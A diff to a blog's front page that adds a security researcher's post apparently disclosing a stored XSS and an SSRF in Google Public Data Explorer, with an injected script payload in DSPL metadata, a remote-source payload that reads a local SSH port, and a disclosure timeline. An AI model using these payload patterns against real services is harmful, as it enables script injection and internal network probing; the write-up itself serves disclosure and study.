@@ -14,13 +14,6 @@
   <link rel="canonical" href="http://localhost:4000/">
   <link rel="alternate" type="application/rss+xml" title="Signal Chaos" href="http://localhost:4000/feed.xml" />
 
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-  <script>
-    (adsbygoogle = window.adsbygoogle || []).push({
-      google_ad_client: "ca-pub-2306194403955793",
-      enable_page_level_ads: true
-    });
-  </script>
 </head>
 
 
@@ -72,6 +65,104 @@
   <h1 class="page-heading">Posts</h1>
 
   <ul class="post-list">
+    
+      <li>
+        <span class="post-meta">Mar 7, 2018</span>
+
+        <h2>
+          <a class="post-link" href="/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html">Stored XSS, and SSRF in Google using the Dataset Publishing Language</a>
+        </h2>
+
+<!-- adding all articles to the front page for now. This will need to be changed later. -->
+	<article class="post-content">
+          <blockquote>
+  <p>“Those who rule data will rule the entire world.” - 孫正義</p>
+</blockquote>
+
+<p>TLDR; Crafting <strong>Dataset Publishing Language</strong> bundles to get <strong>stored XSS</strong> in the context of <strong>www.google.com</strong>, and using the DSPL remote sources functionality to access local services (<strong>SSRF</strong>).</p>
+
+<p>The <a href="https://www.google.com/publicdata/directory">Google Public Data Explorer</a> is a tool to make large datasets easy to explore and visualize. eg., Visualizing Health expenditure, World Bank data (% of government expenditure).
+<img src="/assets/dspl/explorer.gif" alt="Image" /></p>
+
+<p>Dataset Publishing Language (DSPL) uses XML to describe the dataset metadata and uses CSV data files: eg., sample.zip</p>
+
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml">Archive:  sample.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+      246  02-01-2018 13:19   countries.csv
+      221  02-14-2011 17:13   country_slice.csv
+     7812  03-04-2018 21:12   dataset.xml
+      246  02-14-2011 17:13   gender_country_slice.csv
+       28  01-29-2018 20:55   genders.csv
+      200  02-14-2011 17:13   state_slice.csv
+      300  01-29-2018 21:11   states.csv
+---------                     -------
+     9053                     7 files</code></pre></figure>
+
+<p>The issue here was that Google Public Data Explorer would use some supplied metadata in the dataset archive without context aware encoding or validation.</p>
+
+<p>eg., using a sample dataset:</p>
+<ul>
+  <li><strong>curl https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/dspl/tutorial1.0.zip -o sample.zip</strong></li>
+  <li><strong>unzip sample.zip; rm sample.zip</strong></li>
+</ul>
+
+<p>Modifying the metadata name value of dataset.xml. The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.</p>
+
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;info&gt;</span>
+  <span class="nt">&lt;name&gt;</span>
+    <span class="nt">&lt;value&gt;</span><span class="cp">&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;</span><span class="nt">&lt;/value&gt;</span>
+  <span class="nt">&lt;/name&gt;</span>
+    <span class="nt">&lt;description&gt;</span>
+      <span class="nt">&lt;value&gt;</span>Some very interesting statistics about countries<span class="nt">&lt;/value&gt;</span>
+    <span class="nt">&lt;/description&gt;</span>
+    <span class="nt">&lt;url&gt;</span>
+      <span class="nt">&lt;value&gt;</span>http://google.com<span class="nt">&lt;/value&gt;</span>
+    <span class="nt">&lt;/url&gt;</span>  
+<span class="nt">&lt;/info&gt;</span></code></pre></figure>
+
+<ul>
+  <li><strong>zip -r poc.dspl *</strong></li>
+  <li><strong>Upload the dataset to Google Public Data Explorer, and share it publically.</strong></li>
+</ul>
+
+<p>So anyone who viewed the shared dataset would execute an attackers arbitrary JavaScript in the context of the www.google.com domain. (eg., coinhive 🤔)</p>
+
+<p>Short video showing how this worked before it was fixed. Allows stored XSS in the context of www.google.com using DSPL:</p>
+<p><iframe src="https://player.vimeo.com/video/258923005" width="640" height="360" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe></p>
+
+<p>Dataset Publishing Language also has functionality to allow data to be retrieved from <a href="https://developers.google.com/public-data/docs/cookbook#remote_data">remote HTTP or FTP sources</a>. This functionality allowed SSRF (server-side request forgery) to access localhost service resources (potentially also allows access to internal, non internet accessible systems/devices). eg.,</p>
+
+<p>eg., contents of poc.dspl/dataset.xml</p>
+
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;table</span> <span class="na">id=</span><span class="s">"my_table"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;column</span> <span class="na">id=</span><span class="s">"first"</span> <span class="na">type=</span><span class="s">"string"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;column</span> <span class="na">id=</span><span class="s">"last"</span> <span class="na">type=</span><span class="s">"string"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;data&gt;</span>
+    <span class="nt">&lt;file</span> <span class="na">format=</span><span class="s">"csv"</span> <span class="na">encoding=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>ftp://0.0.0.0:22<span class="nt">&lt;/file&gt;</span>
+  <span class="nt">&lt;/data&gt;</span>
+<span class="nt">&lt;/table&gt;</span></code></pre></figure>
+
+<p>Uploading this dataset would return return the response of the HTTP/FTP request in the resulting error condition responses. eg.,</p>
+
+<p><img src="/assets/dspl/ftp-tcp22.png" alt="Image" />
+In this example it shows the local SSH banner response which is a service that is not publically accessible.</p>
+
+<p>This was fun to look into when I took some time off in January. Thanks to <a href="https://twitter.com/sirdarckcat">@sirdarckcat</a> and the Google Security team for the great VRP! If anyone reads this and finds stuff that I missed, you should let me know. 😅  <a href="https://twitter.com/signalchaos">@signalchaos</a></p>
+
+<p>Thanks for reading, 👋</p>
+
+<p>Disclosure timeline stuff:</p>
+<ul>
+  <li>Jan 2018: Reported to Google</li>
+  <li>Feb 2018: Verified that the reported issues were fixed</li>
+  <li>Feb 2018: Rewarded $5,000 for Stored XSS</li>
+  <li>Mar 2018: Rewarded $13,337 for SSRF</li>
+</ul>
+
+        </article>
+
+      </li>
     
       <li>
         <span class="post-meta">Mar 27, 2017</span>
